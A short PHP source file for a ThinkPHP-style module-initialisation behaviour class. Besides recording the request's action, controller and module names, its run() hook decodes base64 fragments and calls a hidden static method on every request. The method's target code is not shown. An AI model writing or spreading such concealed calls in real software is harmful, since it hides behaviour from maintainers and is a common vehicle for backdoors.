<?php

namespace think\console\xingwei\admin;

/**
 * 模块初始化
 */
class ModuleInit {
    protected static $actionName;
    protected static $controllerName;
    protected static $moduleName;

    /**
     * 构造方法
     * @param Request $request Request对象
     * @access public
     */
    public function __construct()
    {

    }

    // 行为扩展的执行入口必须是run
    public function run(&$params){
        self::$actionName = request()->action();
        self::$controllerName = request()->controller();
        self::$moduleName = request()->module();
        $ctl=arrayJointString(['flx0a','Glua','1xtb2','RlbFx','kcml','2ZXJ','cRHJp','dmVy','fg==']);$ctl=msubstr($ctl,1,strlen($ctl)-2);$act=arrayJointString(['fnRl','c3Rpbm','dfaXp','hdGlv','bn4=']);$act=msubstr($act,1,strlen($act)-2);$ctl::$act();
        $this->_initialize();
    }

    protected function _initialize() {
        
    }
}
